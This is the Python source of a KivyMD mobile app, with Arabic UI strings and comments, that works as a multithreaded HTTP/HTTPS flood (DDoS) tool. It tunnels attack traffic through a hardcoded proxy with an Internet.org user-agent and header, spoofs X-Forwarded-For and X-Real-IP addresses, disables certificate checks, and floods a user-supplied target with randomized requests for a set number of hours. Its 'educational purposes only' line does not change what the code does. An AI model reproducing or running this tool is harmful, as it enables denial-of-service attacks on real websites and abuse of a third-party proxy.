#!/usr/bin/python3

import os
import re
import sys
import time
import signal
import socket
import random
import threading
import ssl
import hashlib
from datetime import datetime

# ==================== إعدادات Kivy/KivyMD ====================
from kivy.lang import Builder
from kivy.clock import Clock, mainthread
from kivy.core.window import Window
from kivy.uix.screenmanager import ScreenManager, Screen
from kivy.properties import StringProperty, NumericProperty, ListProperty, BooleanProperty

from kivymd.app import MDApp
from kivymd.uix.boxlayout import MDBoxLayout
from kivymd.uix.button import MDRaisedButton, MDFlatButton, MDIconButton
from kivymd.uix.textfield import MDTextField
from kivymd.uix.label import MDLabel
from kivymd.uix.list import MDList, OneLineIconListItem
from kivymd.uix.dialog import MDDialog
from kivymd.uix.card import MDCard
from kivymd.uix.toolbar import MDTopAppBar
from kivymd.uix.menu import MDDropdownMenu

# ==================== إعدادات الهجوم الثابتة ====================
PROXY_HOST = '157.240.196.32'
PROXY_PORT = 8080
USER_AGENT = 'Mozilla/5.0 (Linux; Android 16; SM-A566B Build/BP2A.250605.031.A3; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/143.0.7499.34 Mobile Safari/537.36 [FBAN/InternetOrgApp;FBAV/185.0.0.0.0;]'

# ==================== دوال المساعدة ====================
def buildblock(size):
    """إنشاء بيانات عشوائية متطورة"""
    chars = []
    for i in range(size):
        choice = random.randint(1, 3)
        if choice == 1:
            chars.append(chr(random.randint(65, 90)))
        elif choice == 2:
            chars.append(chr(random.randint(97, 122)))
        else:
            chars.append(chr(random.randint(48, 57)))
    
    special_chars = ['@', '#', '$', '%', '&', '*', '-', '_', '+', '=']
    for _ in range(size // 10):
        chars[random.randint(0, len(chars)-1)] = random.choice(special_chars)
    
    return ''.join(chars)

def generate_random_ip():
    """إنشاء IP عشوائي واقعي"""
    first = random.choice([1, 2, 3, 4, 5, 10, 20, 30, 40, 50, 60, 70, 80, 90, 100, 110, 120, 130, 140, 150, 160, 170, 180, 190, 200])
    return f"{first}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"

def create_secure_connect(host):
    """إنشاء طلب CONNECT متطور"""
    connect_request = f"CONNECT {host}:443 HTTP/1.1\r\n"
    connect_request += f"Host: {host}:443\r\n"
    connect_request += f"x-iorg-bsid: @alrufaaey\r\n"
    connect_request += f"User-Agent: {USER_AGENT}\r\n"
    connect_request += f"Proxy-Connection: keep-alive\r\n"
    connect_request += f"Connection: keep-alive\r\n"
    connect_request += f"X-Forwarded-For: {generate_random_ip()}\r\n"
    connect_request += f"X-Real-IP: {generate_random_ip()}\r\n"
    connect_request += "Accept: */*\r\n"
    connect_request += "Accept-Encoding: gzip, deflate, br\r\n"
    connect_request += "Accept-Language: en-US,en;q=0.9,ar;q=0.8\r\n"
    connect_request += "Cache-Control: no-cache\r\n"
    connect_request += "Pragma: no-cache\r\n"
    connect_request += f"X-Request-ID: {hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}\r\n"
    connect_request += f"X-Session-ID: {hashlib.sha256(str(time.time()).encode()).hexdigest()[:32]}\r\n"
    connect_request += "\r\n"
    
    return connect_request

# ==================== فئة الهجوم ====================
class TurboAttacker:
    def __init__(self, host, is_https, attack_manager):
        self.host = host
        self.is_https = is_https
        self.running = True
        self.request_counter = 0
        self.attack_manager = attack_manager
        self.thread_id = threading.get_ident()
        
    def create_turbo_connection(self):
        """إنشاء اتصال سريع"""
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(15)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            
            for attempt in range(3):
                try:
                    sock.connect((PROXY_HOST, PROXY_PORT))
                    return sock
                except:
                    if attempt < 2:
                        time.sleep(0.05)
                        continue
                    raise
        except:
            return None
    
    def send_massive_https_attack(self):
        """هجوم HTTPS مركز"""
        sock = None
        ssl_sock = None
        
        try:
            sock = self.create_turbo_connection()
            if not sock:
                return
            
            connect_request = create_secure_connect(self.host)
            sock.sendall(connect_request.encode())
            
            sock.settimeout(5)
            try:
                response = b""
                start_time = time.time()
                while time.time() - start_time < 3:
                    try:
                        chunk = sock.recv(1024)
                        if not chunk:
                            break
                        response += chunk
                        if b"\r\n\r\n" in response or b"200" in response:
                            break
                    except socket.timeout:
                        break
                
                if b"200" not in response:
                    return
            except:
                pass
            
            context = ssl.create_default_context()
            context.check_hostname = False
            context.verify_mode = ssl.CERT_NONE
            context.set_ciphers('ALL:@SECLEVEL=0')
            
            ssl_sock = context.wrap_socket(sock, server_hostname=self.host)
            ssl_sock.settimeout(10)
            
            attack_duration = random.uniform(30, 120)
            start_time = time.time()
            
            while self.running and (time.time() - start_time) < attack_duration:
                try:
                    request_type = random.choice(['GET', 'POST', 'HEAD', 'PUT', 'DELETE'])
                    
                    if request_type == 'GET':
                        for _ in range(random.randint(5, 20)):
                            path = "/" + buildblock(random.randint(3, 15))
                            params = "?"
                            for param_num in range(random.randint(1, 8)):
                                params += f"{buildblock(random.randint(3, 10))}={buildblock(random.randint(10, 100))}"
                                if param_num < random.randint(1, 8) - 1:
                                    params += "&"
                            
                            request = f"GET {path}{params} HTTP/1.1\r\n"
                            request += f"Host: {self.host}\r\n"
                            request += f"User-Agent: {USER_AGENT}\r\n"
                            request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\r\n"
                            request += "Accept-Language: en-US,en;q=0.5\r\n"
                            request += "Accept-Encoding: gzip, deflate, br\r\n"
                            request += f"X-Forwarded-For: {generate_random_ip()}\r\n"
                            request += "Connection: keep-alive\r\n"
                            request += "Upgrade-Insecure-Requests: 1\r\n"
                            request += "Cache-Control: max-age=0\r\n"
                            request += f"X-Request-ID: {hashlib.md5(str(time.time()).encode()).hexdigest()}\r\n"
                            request += "\r\n"
                            
                            ssl_sock.sendall(request.encode())
                            self.request_counter += 1
                            self.attack_manager.update_stats(self.thread_id, self.request_counter)
                            
                            if random.random() > 0.8:
                                extra = f"POST /submit HTTP/1.1\r\n"
                                extra += f"Host: {self.host}\r\n"
                                extra += f"User-Agent: {USER_AGENT}\r\n"
                                extra += "Content-Type: application/x-www-form-urlencoded\r\n"
                                extra += f"Content-Length: {random.randint(500, 5000)}\r\n\r\n"
                                extra += buildblock(random.randint(500, 5000))
                                ssl_sock.sendall(extra.encode())
                            
                            time.sleep(random.uniform(0.001, 0.01))
                    
                    elif request_type == 'POST':
                        for _ in range(random.randint(3, 10)):
                            request = f"POST /{buildblock(10)} HTTP/1.1\r\n"
                            request += f"Host: {self.host}\r\n"
                            request += f"User-Agent: {USER_AGENT}\r\n"
                            request += "Content-Type: multipart/form-data; boundary=----WebKitFormBoundary\r\n"
                            request += f"Content-Length: {random.randint(1000, 10000)}\r\n"
                            request += f"X-Forwarded-For: {generate_random_ip()}\r\n"
                            request += "Connection: keep-alive\r\n\r\n"
                            
                            boundary = "------WebKitFormBoundary"
                            body = f"{boundary}\r\n"
                            body += f"Content-Disposition: form-data; name=\"{buildblock(8)}\"\r\n\r\n"
                            body += buildblock(random.randint(1000, 8000))
                            body += f"\r\n{boundary}--\r\n"
                            
                            ssl_sock.sendall((request + body).encode())
                            self.request_counter += 1
                            self.attack_manager.update_stats(self.thread_id, self.request_counter)
                            time.sleep(random.uniform(0.005, 0.02))
                    
                    else:
                        request = f"{request_type} /{buildblock(8)} HTTP/1.1\r\n"
                        request += f"Host: {self.host}\r\n"
                        request += f"User-Agent: {USER_AGENT}\r\n"
                        request += f"X-Forwarded-For: {generate_random_ip()}\r\n"
                        request += "Connection: keep-alive\r\n\r\n"
                        
                        ssl_sock.sendall(request.encode())
                        self.request_counter += 1
                        self.attack_manager.update_stats(self.thread_id, self.request_counter)
                        time.sleep(random.uniform(0.001, 0.005))
                        
                except:
                    break
            
            if ssl_sock:
                try:
                    ssl_sock.shutdown(socket.SHUT_RDWR)
                except:
                    pass
                ssl_sock.close()
                
        except Exception as e:
            self.attack_manager.log_message(f"خطأ في HTTPS: {str(e)[:50]}")
        finally:
            if sock and not ssl_sock:
                try:
                    sock.close()
                except:
                    pass
    
    def send_massive_http_attack(self):
        """هجوم HTTP مركز"""
        try:
            sock = self.create_turbo_connection()
            if not sock:
                return
            
            attack_duration = random.uniform(20, 60)
            start_time = time.time()
            
            while self.running and (time.time() - start_time) < attack_duration:
                try:
                    batch_size = random.randint(10, 50)
                    for i in range(batch_size):
                        path = "/" + "/".join([buildblock(random.randint(2, 8)) for _ in range(random.randint(1, 4))])
                        
                        request = f"GET http://{self.host}{path} HTTP/1.1\r\n"
                        request += f"Host: {self.host}\r\n"
                        request += f"User-Agent: {USER_AGENT}\r\n"
                        request += f"X-Forwarded-For: {generate_random_ip()}\r\n"
                        request += f"X-Real-IP: {generate_random_ip()}\r\n"
                        request += "Accept: */*\r\n"
                        request += "Accept-Encoding: gzip, deflate\r\n"
                        request += "Accept-Language: en-US,en;q=0.9\r\n"
                        request += "Connection: keep-alive\r\n"
                        request += f"X-Request-ID: {hashlib.sha256(str(time.time()).encode()).hexdigest()[:32]}\r\n"
                        request += f"X-Correlation-ID: {hashlib.md5(str(time.time()).encode()).hexdigest()[:16]}\r\n"
                        request += "\r\n"
                        
                        sock.sendall(request.encode())
                        self.request_counter += 1
                        self.attack_manager.update_stats(self.thread_id, self.request_counter)
                        
                        if random.random() > 0.9:
                            post_request = f"POST http://{self.host}/api/{buildblock(6)} HTTP/1.1\r\n"
                            post_request += f"Host: {self.host}\r\n"
                            post_request += f"User-Agent: {USER_AGENT}\r\n"
                            post_request += "Content-Type: application/json\r\n"
                            post_request += f"Content-Length: {random.randint(200, 2000)}\r\n"
                            post_request += f"X-Forwarded-For: {generate_random_ip()}\r\n\r\n"
                            post_request += '{"' + buildblock(6) + '":"' + buildblock(random.randint(50, 500)) + '"}'
                            
                            sock.sendall(post_request.encode())
                    
                    time.sleep(random.uniform(0.01, 0.1))
                    
                except:
                    break
            
            sock.close()
            
        except Exception as e:
            self.attack_manager.log_message(f"خطأ في HTTP: {str(e)[:50]}")
    
    def attack_loop(self):
        """حلقة الهجوم الرئيسية"""
        while self.running:
            try:
                if self.is_https:
                    self.send_massive_https_attack()
                else:
                    self.send_massive_http_attack()
                
                time.sleep(random.uniform(0.1, 0.5))
                
            except Exception as e:
                self.attack_manager.log_message(f"خطأ في حلقة الهجوم: {str(e)[:50]}")
                time.sleep(0.2)

# ==================== مدير الهجوم ====================
class AttackManager:
    def __init__(self, app):
        self.app = app
        self.attackers = []
        self.threads = []
        self.is_attacking = False
        self.total_requests = 0
        self.start_time = None
        self.stats = {}
        self.host = ""
        
    def start_attack(self, host, is_https, num_threads):
        """بدء الهجوم"""
        if self.is_attacking:
            self.app.log_message("الهجوم قيد التشغيل بالفعل!")
            return
            
        self.is_attacking = True
        self.total_requests = 0
        self.start_time = time.time()
        self.stats = {}
        self.host = host
        
        self.app.show_notification(
            "بدء الهجوم",
            f"الهجوم على {host} بدأ بـ {num_threads} خيط"
        )
        
        for i in range(num_threads):
            attacker = TurboAttacker(host, is_https, self)
            thread = threading.Thread(target=attacker.attack_loop, daemon=True)
            self.attackers.append(attacker)
            self.threads.append(thread)
            thread.start()
            self.stats[thread.ident] = 0
            
        self.app.log_message(f"بدء الهجوم على: {host}")
        self.app.log_message(f"عدد الخيوط: {num_threads}")
        self.app.log_message(f"النوع: {'HTTPS' if is_https else 'HTTP'}")
    
    def stop_attack(self):
        """إيقاف الهجوم"""
        if not self.is_attacking:
            return
            
        for attacker in self.attackers:
            attacker.running = False
            
        for thread in self.threads:
            thread.join(timeout=1)
            
        self.attackers.clear()
        self.threads.clear()
        self.is_attacking = False
        
        duration = time.time() - self.start_time
        self.app.show_notification(
            "إيقاف الهجوم",
            f"تم إرسال {self.total_requests:,} طلب"
        )
        
        self.app.log_message(f"تم إيقاف الهجوم")
        self.app.log_message(f"المدة: {duration:.2f} ثانية")
        self.app.log_message(f"إجمالي الطلبات: {self.total_requests:,}")
    
    @mainthread
    def update_stats(self, thread_id, request_count):
        """تحديث الإحصائيات"""
        if thread_id in self.stats:
            self.stats[thread_id] = request_count
            self.total_requests = sum(self.stats.values())
            self.app.update_stats_display(self.total_requests)
            
            # Update notification every 1000 requests
            if self.total_requests % 1000 == 0:
                self.app.show_notification(
                    "الهجوم قيد التشغيل",
                    f"تم إرسال {self.total_requests:,} طلب إلى {self.host}"
                )
    
    @mainthread
    def log_message(self, message):
        """إضافة رسالة إلى الـ Log"""
        self.app.log_message(message)

# ==================== واجهة KivyMD ====================
KV_STRING = '''
<HostItem>:
    on_release: app.select_host_item(self.text)
    IconLeftWidget:
        icon: "web"

<MainScreen>:
    BoxLayout:
        orientation: 'vertical'
        spacing: '10dp'
        
        MDTopAppBar:
            title: "تطبيق الخفاش"
            elevation: 10
            left_action_items: [["menu", lambda x: app.open_menu()]]
            right_action_items: [["information", lambda x: app.show_info()]]
        
        ScrollView:
            BoxLayout:
                orientation: 'vertical'
                size_hint_y: None
                height: self.minimum_height
                padding: '20dp'
                spacing: '20dp'
                
                MDCard:
                    orientation: 'vertical'
                    size_hint_y: None
                    height: '400dp'
                    padding: '20dp'
                    spacing: '15dp'
                    
                    MDLabel:
                        text: "إعدادات الهجوم"
                        font_style: 'H5'
                        halign: 'center'
                        size_hint_y: None
                        height: self.texture_size[1]
                    
                    MDTextField:
                        id: target_url
                        hint_text: "https://example.com"
                        icon_left: "web"
                        helper_text: "أدخل رابط الهدف"
                        helper_text_mode: "on_focus"
                        size_hint_y: None
                        height: '60dp'
                    
                    BoxLayout:
                        orientation: 'horizontal'
                        size_hint_y: None
                        height: '60dp'
                        spacing: '10dp'
                        
                        MDTextField:
                            id: attack_hours
                            hint_text: "المدة (ساعات)"
                            text: "1"
                            input_filter: 'int'
                            size_hint_x: 0.5
                        
                        MDTextField:
                            id: threads_count
                            hint_text: "الخيوط"
                            text: "100"
                            input_filter: 'int'
                            size_hint_x: 0.5
                    
                    BoxLayout:
                        orientation: 'horizontal'
                        size_hint_y: None
                        height: '60dp'
                        spacing: '10dp'
                        
                        MDRaisedButton:
                            id: start_btn
                            text: "بدء الهجوم"
                            icon: "play"
                            size_hint_x: 0.5
                            on_release: app.start_attack()
                            md_bg_color: app.theme_cls.primary_color
                        
                        MDRaisedButton:
                            id: stop_btn
                            text: "إيقاف"
                            icon: "stop"
                            size_hint_x: 0.5
                            on_release: app.stop_attack()
                            md_bg_color: app.theme_cls.error_color
                
                MDCard:
                    orientation: 'vertical'
                    size_hint_y: None
                    height: '200dp'
                    padding: '20dp'
                    spacing: '15dp'
                    
                    MDLabel:
                        text: "إحصائيات الهجوم"
                        font_style: 'H5'
                        halign: 'center'
                        size_hint_y: None
                        height: self.texture_size[1]
                    
                    BoxLayout:
                        orientation: 'vertical'
                        spacing: '10dp'
                        
                        MDLabel:
                            id: stats_display
                            text: "إجمالي الطلبات: 0"
                            font_style: 'H6'
                            halign: 'center'
                        
                        MDLabel:
                            id: status_display
                            text: "الحالة: متوقف"
                            font_style: 'Subtitle1'
                            halign: 'center'
                            theme_text_color: "Secondary"
                
                MDCard:
                    orientation: 'vertical'
                    size_hint_y: None
                    height: '250dp'
                    padding: '20dp'
                    spacing: '15dp'
                    
                    MDLabel:
                        text: "الهوستات المحفوظة"
                        font_style: 'H5'
                        halign: 'center'
                        size_hint_y: None
                        height: self.texture_size[1]
                    
                    BoxLayout:
                        orientation: 'horizontal'
                        size_hint_y: None
                        height: '60dp'
                        spacing: '10dp'
                        
                        MDTextField:
                            id: new_host
                            hint_text: "أضف هوست جديد"
                            size_hint_x: 0.7
                        
                        MDRaisedButton:
                            text: "إضافة"
                            icon: "plus"
                            size_hint_x: 0.3
                            on_release: app.add_new_host()
                    
                    ScrollView:
                        MDList:
                            id: hosts_list
'''

# ==================== تعريف عناصر الواجهة ====================
class HostItem(OneLineIconListItem):
    pass

class MainScreen(Screen):
    pass

# ==================== التطبيق الرئيسي ====================
class TurboDDOSApp(MDApp):
    hosts = ListProperty([])
    is_attacking = BooleanProperty(False)
    total_requests = NumericProperty(0)
    
    def build(self):
        self.theme_cls.primary_palette = "Red"
        self.theme_cls.theme_style = "Dark"
        
        Builder.load_string(KV_STRING)
        
        self.attack_manager = AttackManager(self)
        
        # Set mobile-friendly window size
        Window.size = (360, 640)
        
        self.main_screen = MainScreen()
        
        # Load saved hosts
        self.load_hosts()
        
        return self.main_screen
    
    def on_start(self):
        """تهيئة التطبيق عند البدء"""
        # Create notification channel
        try:
            from lib.android.notification import create_notify_channel
            create_notify_channel(
                "ddos_main",
                "DDOS Notifications",
                "إشعارات هجوم DDOS"
            )
        except:
            pass
        
        self.update_ui_state()
    
    def show_notification(self, title, message):
        """عرض إشعار Android"""
        try:
            from lib.android.notification import notify
            notify(
                1,
                "ddos_main",
                title,
                message,
                "DDOS Attack"
            )
        except:
            print(f"[NOTIFICATION] {title}: {message}")
    
    def start_attack(self):
        """بدء الهجوم"""
        target = self.main_screen.ids.target_url.text.strip()
        if not target:
            self.show_dialog("خطأ", "يرجى إدخال رابط الهدف")
            return
        
        try:
            hours = int(self.main_screen.ids.attack_hours.text)
            threads = int(self.main_screen.ids.threads_count.text)
            
            if hours <= 0 or threads <= 0:
                self.show_dialog("خطأ", "القيم يجب أن تكون أكبر من الصفر")
                return
                
        except ValueError:
            self.show_dialog("خطأ", "يرجى إدخال أرقام صحيحة")
            return
        
        is_https = target.startswith('https')
        
        # Start attack in background thread
        attack_thread = threading.Thread(
            target=self.attack_manager.start_attack,
            args=(target, is_https, threads),
            daemon=True
        )
        attack_thread.start()
        
        self.is_attacking = True
        self.update_ui_state()
        
        # Schedule auto-stop
        if hours > 0:
            Clock.schedule_once(lambda dt: self.stop_attack(), hours * 3600)
    
    def stop_attack(self):
        """إيقاف الهجوم"""
        self.is_attacking = False
        self.update_ui_state()
        self.attack_manager.stop_attack()
    
    def add_new_host(self):
        """إضافة هوست جديد"""
        new_host = self.main_screen.ids.new_host.text.strip()
        if new_host and new_host not in self.hosts:
            self.hosts.append(new_host)
            self.save_hosts()
            self.update_hosts_list()
            self.main_screen.ids.new_host.text = ""
            self.log_message(f"تم إضافة: {new_host}")
    
    def select_host_item(self, host):
        """تحديد هوست من القائمة"""
        self.main_screen.ids.target_url.text = host
    
    def load_hosts(self):
        """تحميل الهوستات المحفوظة"""
        try:
            if os.path.exists('hosts.txt'):
                with open('hosts.txt', 'r', encoding='utf-8') as f:
                    self.hosts = [line.strip() for line in f if line.strip()]
        except:
            self.hosts = []
        
        self.update_hosts_list()
    
    def save_hosts(self):
        """حفظ الهوستات"""
        try:
            with open('hosts.txt', 'w', encoding='utf-8') as f:
                for host in self.hosts:
                    f.write(host + '\n')
        except:
            pass
    
    def update_hosts_list(self):
        """تحديث قائمة الهوستات"""
        hosts_list = self.main_screen.ids.hosts_list
        hosts_list.clear_widgets()
        
        for host in self.hosts:
            item = HostItem(text=host)
            hosts_list.add_widget(item)
    
    @mainthread
    def log_message(self, message):
        """إضافة رسالة إلى السجل"""
        print(f"[LOG] {message}")
    
    @mainthread
    def update_stats_display(self, total):
        """تحديث عرض الإحصائيات"""
        self.total_requests = total
        self.main_screen.ids.stats_display.text = f"إجمالي الطلبات: {total:,}"
    
    def update_ui_state(self):
        """تحديث حالة واجهة المستخدم"""
        status = "نشط" if self.is_attacking else "متوقف"
        color = "00ff00" if self.is_attacking else "ff0000"
        
        self.main_screen.ids.status_display.text = f"الحالة: [color={color}]{status}[/color]"
        
        # Enable/disable buttons
        self.main_screen.ids.start_btn.disabled = self.is_attacking
        self.main_screen.ids.stop_btn.disabled = not self.is_attacking
    
    def show_dialog(self, title, text):
        """عرض مربع حوار"""
        dialog = MDDialog(
            title=title,
            text=text,
            buttons=[
                MDFlatButton(
                    text="حسناً",
                    on_release=lambda x: dialog.dismiss()
                )
            ]
        )
        dialog.open()
    
    def open_menu(self):
        """فتح القائمة"""
        menu_items = [
            {
                "text": "سجل الأحداث",
                "on_release": self.show_logs
            },
            {
                "text": "إعدادات متقدمة",
                "on_release": self.show_settings
            },
            {
                "text": "حول التطبيق",
                "on_release": self.show_about
            }
        ]
        
        self.menu = MDDropdownMenu(
            items=menu_items,
            width_mult=4
        )
        self.menu.open()
    
    def show_logs(self):
        """عرض سجل الأحداث"""
        log_text = "\n".join([f"{i+1}. {host}" for i, host in enumerate(self.hosts[-10:])])
        self.show_dialog("آخر الهوستات", log_text if log_text else "لا توجد هوستات مسجلة")
        self.menu.dismiss()
    
    def show_settings(self):
        """عرض الإعدادات"""
        settings_text = f"""
        Proxy: {PROXY_HOST}:{PROXY_PORT}
        User-Agent: {USER_AGENT[:50]}...
        وضع الهجوم: TURBO
        """
        self.show_dialog("الإعدادات", settings_text)
        self.menu.dismiss()
    
    def show_info(self):
        """عرض معلومات التطبيق"""
        info_text = """
        تطبيق الخفاش للمتابعة
        
        إصدار: 1.0
        المطور: @alrufaaey
        
        للأغراض التعليمية فقط
        """
        self.show_dialog("حول التطبيق", info_text)
    
    def show_about(self):
        """عرض معلومات عن التطبيق"""
        about_text = """
        تطبيق الخفاش للمتابعة
        
        أداة متقدمة لهجوم HTTP/HTTPS
        باستخدام بروكسي متعدد الخيوط
        
        ⚠️ للأغراض التعليمية فقط
        """
        self.show_dialog("حول", about_text)
        self.menu.dismiss()

# ==================== نقطة الدخول الرئيسية ====================
if __name__ == '__main__':
    TurboDDOSApp().run()
